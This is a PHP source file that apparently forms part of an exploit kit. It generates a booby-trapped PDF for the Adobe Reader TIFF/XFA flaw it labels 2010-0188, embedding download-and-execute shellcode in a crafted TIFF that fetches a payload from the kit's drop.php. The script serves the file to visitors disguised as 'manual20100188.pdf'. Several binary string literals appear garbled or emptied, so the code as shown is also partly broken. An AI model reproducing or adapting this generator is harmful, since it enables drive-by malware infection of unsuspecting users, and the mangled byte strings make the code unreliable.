<?php


function generate_tiff($url) {
	$shellcode_offset = 400;
	$tiff_offset = 8248;
	$shellcode = shellcode_dl_exec( $url );
	$tiff = 'MM';
	$tiff = $tiff . '';
	$tiff = $tiff . pack( 'N', $tiff_offset );
	$tiff = $tiff . str_repeat( '', $shellcode_offset );
	$tiff = $tiff . $shellcode;
	$tiff = $tiff . str_repeat( '', $tiff_offset - 8 - strlen( $shellcode ) - $shellcode_offset );
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . ')';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '';
	$tiff = $tiff . '$';
	$tiff = $tiff . '£ë€J< ‚J¼W€J¤ë€J';
	$tiff = $tiff . 'C‚J';
	$tiff = $tiff . '';
	$tiff = $tiff . '¤ë€JƒþJ€J';
	$tiff = $tiff . '}Y€J£ë€J8 ‚J¼W€J';
	$tiff = $tiff . '¤ë€Jÿÿÿÿ';
	$tiff = $tiff . '';
	$tiff = $tiff . '¤ë€JƒþJ€J';
	$tiff = $tiff . '}Y€J£ë€J0 ‚J¼W€J';
	$tiff = $tiff . '¤ë€Jÿÿÿÿ"';
	$tiff = $tiff . '';
	$tiff = $tiff . 'c€J€JZRj÷‚J';
	$tiff = $tiff . '±J€JXÍ.<÷‚J';
	$tiff = $tiff . '±J€JZtô÷‚J';
	$tiff = $tiff . '±J€J¸MM';
	$tiff = $tiff . '±J€J*‹ú¯÷‚J';
	$tiff = $tiff . '±J€Juê‡þ÷‚J';
	$tiff = $tiff . '±J€Jë
_¹÷‚J';
	$tiff = $tiff . '±J€Jà';
	$tiff = $tiff . '±J€Jó¥ë	÷‚J';
	$tiff = $tiff . '±J€Jèñÿÿ÷‚J';
	$tiff = $tiff . '±J€Jÿ÷‚J';
	$tiff = $tiff . '±J€Jÿÿÿ÷‚J';
	$tiff = $tiff . '£ë€JxP„JI¦J€J';
	return $tiff;
}

function generate_xml($url) {
	$tiff = base64_encode( generate_tiff( $url ) );
	$xml = '<?xml version="1.0" encoding="UTF-8" ?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf>
<version>1.65</version>
<interactive>1</interactive>
<linearized>1</linearized>
</pdf>
<xdp>
<packets>*</packets>
</xdp>
<destination>pdf</destination>
</present>
</config>
<template baseProfile="interactiveForms" xmlns="http://www.xfa.org/schema/xfa-template/2.4/">
<subform name="Top" layout="tb" locale="en_US">
<pageSet>
<pageArea id="PageArea1" name="PageArea1">
<contentArea name="ContentArea1" x="0pt" y="0pt" w="612pt" h="792pt" />
<medium short="612pt" long="792pt" stock="custom" />
</pageArea>
</pageSet>
<subform name="Page1" x="0pt" y="0pt" w="612pt" h="792pt">
<break before="pageArea" beforeTarget="#PageArea1" />
<bind match="none" />
<field name="Image" w="28.575mm" h="1.39mm" x="37.883mm" y="29.25mm">
<ui>
<imageEdit />
</ui>
</field>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner FormTargetVersion 24?>
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?>
<?templateDesigner Zoom 94?>
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<Top>
<Image xfa:contentType="image/tif" href="">' . $tiff . '</Image>
</Top>
</xfa:data>
</xfa:datasets>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" print="1" printHighQuality="1" change="1" modifyAnnots="1" formFieldFilling="1" documentAssembly="1" contentCopy="1" accessibleContent="1" metadata="1" />
<form xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="Top">
<instanceManager name="_Page1" />
<subform name="Page1">
<field name="Image" />
</subform>
<pageSet>
<pageArea name="PageArea1" />
</pageSet>
</subform>
</form>
</xdp:xdp>';
	return $xml;
}

function generate_pdf($url) {
	$xml = pdf_FlateEncode( generate_xml( $url ) );
	$xmllen = strlen( $xml );
	$eol = '
';
	$endobj = 'endobj' . $eol;
	$xref = array(  );
	$pdf = '%PDF-1.5' . $eol;
	$pdf = $pdf . '%' . RandomNonASCIIString( 4 ) . $eol;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 1 ) . '<</Length ' . strlen( $xml ) . '/Filter [/FlateDecode]/Type /EmbeddedFile>>' . $eol;
	$pdf = $pdf . 'stream' . $eol;
	$pdf = $pdf . $xml . $eol;
	$pdf = $pdf . $eol . 'endstream' . $eol;
	$pdf = $pdf . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 2 ) . '<</V () /Kids [' . ioRef( 3 ) . '] /T (' . 'Top[0]' . ') >>' . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 3 ) . '<</Parent ' . ioRef( 2 ) . ' /Kids [' . ioRef( 4 ) . '] /T (Page1[0])>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 4 ) . '<</MK <</IF <</A [0.0 1.0]>>/TP 1>>/P ' . ioRef( 5 );
	$pdf = $pdf . '/FT /Btn/TU (' . 'Image' . ')/Ff 65536/Parent ' . ioRef( 3 );
	$pdf = $pdf . '/F 4/DA (/CourierStd 10 Tf 0 g)/Subtype /Widget/Type /Annot/T (' . 'Image[0]' . ')/Rect [107.385 705.147 188.385 709.087]>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 5 ) . '<</Rotate 0 /CropBox [0.0 0.0 612.0 792.0]/MediaBox [0.0 0.0 612.0 792.0]/Resources <</XObject >>/Parent ';
	$pdf = $pdf . ioRef( 6 ) . '/Type /Page/PieceInfo null>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 6 ) . '<</Kids [' . ioRef( 5 ) . ']/Type /Pages/Count 1>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 7 ) . '<</PageMode /UseAttachments/Pages ' . ioRef( 6 );
	$pdf = $pdf . '/MarkInfo <</Marked true>>/Lang (en-us)/AcroForm ' . ioRef( 8 );
	$pdf = $pdf . '/Type /Catalog>>';
	$pdf = $pdf . $eol . $endobj;
	$xref[] = strlen( $pdf );
	$pdf = $pdf . ioDef( 8 ) . '<</DA (/Helv 0 Tf 0 g )/XFA [(template) ' . ioRef( 1 ) . ']/Fields [';
	$pdf = $pdf . ioRef( 2 ) . ']>>';
	$pdf = $pdf . $endobj . $eol;
	$xrefPosition = strlen( $pdf );
	$pdf = $pdf . 'xref' . $eol;
	$pdf = $pdf . '0 ' . ( count( $xref ) + 1 ) . $eol;
	$pdf = $pdf . '0000000000 65535 f' . $eol;
	$i = 0;

	while ($i < count( $xref )) {
		$temp = sprintf( '%010d 00000 n', $xref[$i] );
		$pdf = $pdf . $temp . $eol;
		++$i;
	}

	$pdf = $pdf . 'trailer' . '<</Size ' . ( count( $xref ) + 1 ) . '/Root ' . ioRef( 7 ) . '>>' . $eol;
	$pdf = $pdf . 'startxref' . $eol;
	$pdf = $pdf . $xrefPosition . $eol;
	$pdf = $pdf . '%%EOF';
	return $pdf;
}

include( 'config.php' );
include( 'include/util.php' );
include( 'include/shellcode.php' );
$pdf = generate_pdf( $config_url . '/drop.php?e=Adobe-80-2010-0188' );
header( 'Expires: Mon, 26 Jul 1997 05:00:00 GMT' );
header( 'Cache-Control: no-cache' );
header( 'Pragma: no-cache' );
header( 'Accept-Ranges: bytes
' );
header( 'Content-Length: ' . strlen( $pdf ) . '
' );
header( 'Content-Disposition: inline; filename=manual20100188.pdf' );
header( '
' );
header( 'Content-Type: application/pdf

' );
echo $pdf;
?>
